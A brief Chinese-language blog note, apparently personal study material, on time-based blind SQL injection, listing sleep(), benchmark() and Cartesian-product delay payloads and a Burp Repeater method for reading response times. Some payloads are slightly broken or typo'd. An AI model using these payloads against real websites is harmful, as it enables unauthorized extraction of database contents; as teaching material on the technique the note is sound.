# 时间盲注


## 1.常用函数
（1）**sleep（）**
```
?id=1&#39; and if(1,sleep(),0) --&#43;
```
如果1为真，则延时3秒，否则无延时
（2）**benchmark（）**
```
benchmark(1000000,sha(1))
```
对sha这个操作超级多次
（3）笛卡尔积		
```
select if(1=1,(SELECT count(*) FROM information_schema,columns B),0)
```
## 2.主要思路
bp抓包，放repeter里面response
看response右下角的时间，利用延时判真假			
				
			
				
			


---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2023web-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/  

